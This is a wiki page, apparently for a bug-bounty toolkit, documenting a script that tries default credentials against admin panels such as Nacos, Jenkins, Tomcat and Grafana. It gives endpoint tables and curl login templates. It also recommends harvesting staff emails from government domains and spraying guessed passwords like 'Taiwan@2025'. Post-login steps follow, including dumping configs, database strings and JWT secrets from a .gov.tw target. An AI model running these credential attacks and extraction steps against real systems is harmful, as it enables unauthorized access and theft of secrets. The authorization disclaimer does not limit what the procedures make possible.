---
type: wiki
category: hunter
hunter: weak-login
status: active
last-updated: 2026-04-21
---

# Hunter: `weak-login`

> **Purpose:** Against common admin interfaces, send **1-3** default-credential attempts (not brute force).
> **Design principle:** confirm the vendor panel exists via HEAD/GET first before sending a login request; at most 3 attempts per vendor.

## Why this isn't "brute forcing"

- **Brute force = tens to hundreds of login attempts per second** → gets blocked by WAF, gets rate-limited
- **weak-login** = 1-3 known default combinations per vendor → almost never detected
- In essence: **vendor default-credential verification**, not password guessing

## Usage

```bash
# Full scan
tools/hunters/hunt-weak-login.sh https://target

# SAFE=1: only runs vendors where "1 request is enough to judge" (most conservative)
SAFE=1 tools/hunters/hunt-weak-login.sh https://target

# Via bbflow
bbflow hunt target --only weak-login
```

### Output

```
./weak_login_out/https_target.txt
```

```
[12:34:56] === Weak-login hunt: https://target (SAFE=0) ===
[12:34:57] • Nacos panel detected → trying default creds
🔴 [P1-CRIT] Nacos default creds nacos:nacos → token issued @ https://target/nacos/
     evidence: {"accessToken":"eyJhbGci...","tokenTtl":18000,"globalAdmin":true}
```

## Vendors covered (12 primary + 5 passive detections)

| Vendor | Default cred | Flow |
|--------|-------------|------|
| **Nacos** | `nacos / nacos` | POST `/nacos/v1/auth/users/login` → `accessToken` |
| **Druid** | `admin / admin` | POST `/druid/submitLogin.html` → session cookie → index |
| **Grafana** | `admin / admin` | POST `/login` with JSON → `Logged in` |
| **phpMyAdmin** | `root`, `root:root`, `root:password` | grab token → POST `/phpmyadmin/index.php` → check `server_databases.php` |
| **Jenkins** | `admin:admin`, `admin:password`, `admin:jenkins`, `jenkins:jenkins` | Basic Auth on `/api/json` |
| **Tomcat Manager** | `tomcat:tomcat`, `admin:admin`, `admin:tomcat`, `manager:manager` | Basic Auth on `/manager/html` |
| **Solr** | try unauth first, then `solr:SolrRocks` | `/solr/admin/info/system` |
| **RabbitMQ Management** | `guest:guest` | `/api/overview` |
| **Kibana** | usually unauth | `/api/status` |
| **SpringBoot Admin** | usually unauth | `/applications` |
| **Zabbix** | `Admin / zabbix` | POST `/zabbix/index.php` |
| **Apollo** | `apollo / admin` | POST `/signin` |
| **Superset** | manual hint | panel detection, suggests admin:admin / admin:superset |
| **Airflow** | manual hint | panel detection, suggests airflow:airflow |
| **Jeecg/Jeesite** | manual hint | panel detection, suggests admin:123456 / jeecg:jeecg |
| **Shiro** | rememberMe cookie detection | possibly CVE-2016-4437 / CVE-2020-1957 |
| **Gitea/GitLab** | open registration detection | `/user/sign_up`, `/users/sign_up` |

## Extending: add your own vendor

Edit `hunt-weak-login.sh`, copy this template:

```bash
# ═══════════════════════════════════════════════════════════════
# YourVendor — POST /login endpoint
# Default: admin / changeme
# ═══════════════════════════════════════════════════════════════
if exists "/yourvendor/login" "YourVendor Admin|YourVendor Console"; then
  log "• YourVendor panel detected → trying default creds"
  R=$(curl -sk --max-time 8 -X POST "$HOST/yourvendor/api/login" \
    -H "Content-Type: application/json" \
    -d '{"user":"admin","password":"changeme"}' 2>/dev/null)
  if echo "$R" | grep -qE '"token"|"sessionId"|"success":true'; then
    hit "[P1-CRIT] YourVendor default creds admin:changeme @ $HOST"
  fi
fi
```

## What NOT to use this tool for

- ❌ **Don't run SSH/FTP/RDP weak-password checks** — that's brute forcing, out of scope
- ❌ **Don't add more than 5 credential combinations** — that crosses into brute-force territory and will get blocked
- ❌ **Don't run against unauthorized targets** — this is an active attack action
- ❌ **Don't extend it to "try various usernames"** — that becomes credential stuffing

## Passive intel sources (recommended pairing)

First get employee emails from OSINT on the domain, then try that email + a common password:

```bash
# Pull emails from the domain
theHarvester -d target.gov.tw -b all > emails.txt
gau target.gov.tw | grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+' | sort -u >> emails.txt

# For each email, try a single password (not brute force)
# Password candidates: company name + year / Taiwan@2025 / agency abbreviation + 123
```

This kind of "targeted single-attempt testing" is more precise than weak-login, but requires manual pairing.

## Coordination with other hunters

```
config-leak   → /grafana exists    → weak-login tries admin:admin
devops-unauth → /jenkins exists    → weak-login tries admin:admin / admin:password
weak-login    → finds Shiro cookie → use a Shiro exploit tool to verify the CVE
weak-login    → logs into Nacos    → dump config list (/nacos/v1/cs/configs)
weak-login    → logs into Druid    → grab DB connection string → connect to DB to verify
```

## Report writing

**Report focus:**
- Must prove you **can log in** (attach the post-login API response or a screenshot)
- **What you can do after logging in** — read / modify / execute commands (Jenkins script console = RCE)
- **Don't overstate** — an accessible Nacos admin page ≠ guaranteed dump of the entire system config

Example:

```markdown
## Vulnerability Summary
https://target.gov.tw/nacos/ uses the default Nacos admin credentials `nacos:nacos`, allowing an attacker to:
1. Log into the Nacos admin interface
2. Dump the config files for every DataID
3. One of them, `application.yml`, contains DB_PASSWORD and JWT_SECRET

## Reproduction Steps
```bash
# 1. Verify the default credentials
curl -sk -X POST 'https://target.gov.tw/nacos/v1/auth/users/login' \
  --data-urlencode "username=nacos" \
  --data-urlencode "password=nacos"
# {"accessToken":"eyJhbG...","tokenTtl":18000,"globalAdmin":true}

# 2. List all DataIDs
curl -sk 'https://target.gov.tw/nacos/v1/cs/configs?pageNo=1&pageSize=200&search=accurate' \
  -H "accessToken: eyJhbG..." | python3 -m json.tool | grep dataId

# 3. Grab a sensitive config
curl -sk 'https://target.gov.tw/nacos/v1/cs/configs?dataId=application.yml&group=DEFAULT_GROUP' \
  -H "accessToken: eyJhbG..."
```

## Impact
- DB connection string leaked (verified)
- JWT secret leaked → allows forging tokens for any user (verified)
- Nacos is the central config hub → impacts N connected microservices

## Severity
P1-CRITICAL (direct admin access + ability to read production secrets)
```

## Related documents

- [03-xray-rules-reference.md](03-xray-rules-reference.md)
- [02-gov-site-quick-wins.md](02-gov-site-quick-wins.md) §#4
- [10-hunter-config-leak.md](10-hunter-config-leak.md)
